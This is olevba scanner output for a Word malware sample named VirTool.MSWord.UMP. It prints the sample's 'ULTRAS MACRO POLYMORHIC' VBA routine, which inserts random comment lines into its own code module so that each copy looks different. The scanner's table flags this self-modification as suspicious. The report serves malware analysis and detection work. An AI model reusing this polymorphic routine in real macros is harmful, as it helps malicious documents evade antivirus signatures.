olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.UMP
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.UMP - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UMP.bas 
in file: VirTool.MSWord.UMP - OLE stream: 'Macros/VBA/UMP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub UMP()

'-=[ULTRAS MACRO POLYMORHIC]=-

PoNu = Int(Rnd() * 33 + 1)

For Mutate = 1 To PoNu

PoRL = Application.VBE.ActiveVBProject.VBComponents("UMP").CodeModule.CountOfLines

PoLi = Int(Rnd() * PoRL + 1)

a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49

Application.VBE.ActiveVBProject.VBComponents("UMP").CodeModule.InsertLines PoLi, vbTab & "' " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e

Next Mutate

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

